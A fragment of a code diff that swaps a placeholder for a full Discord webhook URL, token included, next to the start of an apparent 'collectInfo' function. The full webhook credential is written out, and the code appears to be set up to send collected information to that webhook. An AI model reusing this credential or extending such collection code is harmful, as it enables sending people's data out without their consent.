@@ -1,4 +1,4 @@
-const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL';
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1300871520205144184/CuxDmYEytRVOR8i8Z5RsbgHiJRnSPo7NQsk4OS8ClhmoMogJOLlGuuCMemVp7A6YrASH';
 
 async function collectInfo() {
     const info = {
